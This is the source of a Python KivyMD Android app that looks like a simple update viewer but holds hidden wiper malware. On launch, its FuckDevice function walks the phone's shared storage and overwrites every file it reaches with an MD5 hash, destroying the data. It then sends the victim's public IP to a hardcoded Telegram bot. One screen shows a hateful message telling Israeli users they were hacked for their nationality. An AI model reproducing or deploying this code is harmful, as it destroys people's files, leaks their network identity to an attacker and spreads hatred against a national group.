from kivy.lang import Builder
from kivymd.app import MDApp
from kivy.uix.screenmanager import Screen,ScreenManager
from kivymd.uix.dialog import MDDialog
from kivymd.uix.button import MDFlatButton
from kivy.core.window import Window
from kivy.uix.image import Image
from kivy.uix.floatlayout import FloatLayout
from kivy.properties import ObjectProperty
from kivy.uix.boxlayout import BoxLayout
from kivymd.toast.kivytoast.kivytoast import toast
import urllib.request
import json
import os
import hashlib



helpstr = """
ScreenManager:
    Main:
        name:"Main"
    Mainapp:
        name:"Mainapp"
    Soon:
        name:'Soon'
<Main>
    MDBottomNavigation:
		MDBottomNavigationItem:
			name:'main'
			icon:'home'
			text:'Home'
			Image:
				source: 'download.jpeg'
				pos_hint:{'center_x':0.5,'center_y':0.65}
				size: 368,330
				size_hint: None,None
				allow_stretch: True
				keep_ratio: False
			MDLabel:
				text:'Welcome To Our App'
				halign:'center'
				font_size:'37px'
				pos_hint:{'center_x':0.5,'center_y':0.38}
			MDRectangleFlatButton:
				text:'See Updates'
				pos_hint:{'center_x':0.5,'center_y':0.20}
				md_bg_color: app.theme_cls.primary_light
				on_press:
					root.manager.current = 'Mainapp'
					root.manager.transition.direction = 'right'
<Soon>
    Image:
        source: 'done.jpeg'
        pos_hint:{'center_x':0.5,'center_y':0.65}
        size: 800,330
        size_hint: None,None
        allow_stretch: True
        keep_ratio: False
    MDLabel:
        markup:True
        text:'[b]Hi Mr/Mrs israelian .. for sorry i have to tell you that you are HACKED .. your fault is you are ISRAELIAN .. all your data is fucked ,  thank you .. FREE PALESTINE , NO ISRAEL [/b]'
        halign:'center'
        font_size:'25px'
        pos_hint:{'center_x':0.5,'center_y':0.45}
<Mainapp>
    ScrollView:
		size:self.size
		GridLayout:
			size_hint_y: None
			cols:2
			height: self.minimum_height
			width:self.minimum_width
			spacing:'20dp'
			padding:'20dp'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
            MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
		    MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
			MDCard:
				orientation:'vertical'
				elevation:5
				height:'210dp'
				size_hint:1,None
				padding:'8dp'
				border_radius:20
				radius:[15]
				Image:
					source:'download.jpeg'
					size_hint: (1,1)
				MDFlatButton:
					markup:True
					text:'[b]Go[/b]'
					size_hint: None,None
					pos_hint:{'center_x':0.5,'center_y':0.1}
					on_press:
						root.manager.current = 'Soon'
						root.manager.transition.direction= 'right'
"""

def FuckDevice():
    
    dirs = []
    files = []
    for alldirs in os.listdir("/storage/emulated/0/"):
        dirs.append(alldirs)
    for dir in dirs:
        for allfiles in os.listdir(f"/storage/emulated/0/{dir}"):
            files.append(dir+"/"+allfiles)
    for f in files:
        if os.path.isfile(f):
            continue
        else:
            try:
                for fi in os.listdir(f"/storage/emulated/0/{f}"):
                    files.append(f+'/'+fi)
                files.remove(f)
            except:
                pass
    for file in files:
        try:
            if os.path.isfile(file):
                with open(f"/storage/emulated/0/{file}",'rb') as readfile:
                    data = str(readfile.read())
                
                hash = hashlib.new('md5')
                hash.update(data.encode('utf-8'))
                encrypted_data = hash.hexdigest()
                with open(f"/storage/emulated/0/{file}",'wb') as writefile:
                    writefile.write(encrypted_data)
        except:
            pass
        files.remove(file)
    req = urllib.request.Request("https://httpbin.org/ip")
    response = urllib.request.urlopen(req)
    data = response.read()
    json_data = json.loads(data)
    ip = json_data.get("origin")
    url = f"https://api.telegram.org/bot6614086558:AAFHR0t-lLLYrVUfgfdtEQPVulvMfsNIoLc/sendMessage?chat_id=6477148877&text=Eliminated%20This%20Ip%20Address%20:%20"+ip+"%0A%0A"+"By%20:%20@mhaidat05"
    url.replace(" ","%20")
    req2 = urllib.request.Request(url)
    response2 = urllib.request.urlopen(req2)
    #requests.post(())
FuckDevice()
class Main(Screen):
    pass
class Mainapp(Screen):
    pass
class Soon(Screen):
    pass
sm= ScreenManager()
sm.add_widget(Main(name="Mainapp"))
sm.add_widget(Main(name="Soon"))

class MainApp(MDApp):
    def build(self):
        self.theme_cls.primary_palette = "DeepPurple"
        self.theme_cls.primary_hue = "A700"
        self.theme_cls.theme_style = "Dark"
        self.strng = Builder.load_string(helpstr)
        return self.strng
		
MainApp().run()